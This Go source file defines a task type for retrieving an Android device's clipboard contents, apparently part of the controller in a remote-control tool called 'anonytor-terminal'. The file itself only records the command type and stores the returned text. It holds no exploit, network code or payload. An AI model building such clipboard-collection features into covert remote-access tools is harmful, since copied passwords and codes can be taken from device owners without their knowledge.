package android

import (
  "anonytor-terminal/controller/task"
  "anonytor-terminal/runtime/definition"
)

type GetClipboardTask struct {
  task.Base
  result string
}

func (t *GetClipboardTask) GetCmdType() definition.CmdType {
  return definition.GetClipboard
}

func (t *GetClipboardTask) OnTaskFinished(data string) {
  t.Status = definition.TaskFinished
  t.result = data
}

func (t *GetClipboardTask) GetResult() string {
  return t.result
}
